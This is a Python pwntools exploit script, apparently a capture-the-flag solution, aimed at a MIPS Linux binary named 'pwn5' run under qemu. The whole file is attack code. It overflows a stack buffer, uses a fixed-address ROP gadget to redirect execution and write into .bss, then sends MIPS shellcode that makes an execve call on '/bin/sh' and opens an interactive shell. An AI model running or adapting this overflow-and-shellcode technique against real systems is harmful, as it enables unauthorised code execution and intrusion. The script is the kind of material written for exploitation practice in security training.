#!/usr/bin/env python3

from pwn import *

context.clear(log_level="info", arch="mips", os="linux")
elf = ELF("./pwn5")

#io = process(["qemu-mipsel", "-g", "2223", "./pwn5"])
io = process(["qemu-mipsel", "./pwn5"])

io.recvuntil("data:\n")

shellcode_addr = elf.bss(0x100)
payload = (
    b"A" * 64 +
    p32(elf.bss(0x200)) + # mock for s8
    p32(0x0046f27c) + #  : lw $v0, 0x20($sp) ; lw $ra, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x30
    b"B" * 0x20 + 
    p32(shellcode_addr) +
    b"D" * 8 +
    p32(0x00400758) # .text:00400758                 move    $a1, $v0
)
io.sendline(payload)

log.info("Shellcode addr 0x%x", shellcode_addr)

mips_shellcode = asm("""
    xor $a1, $a1
    xor $a2, $a2

    li $a0, 0x4a18e0 
    li $v0, 4011
    syscall 0xffff
    nop
""")

payload2 = (
    b"/bin/sh\x00" +
    mips_shellcode
)

payload2 += (
    b"\xcc" * (348 - len(payload2)) +
    p32(shellcode_addr + 8)
)

io.sendline(payload2)

io.interactive()
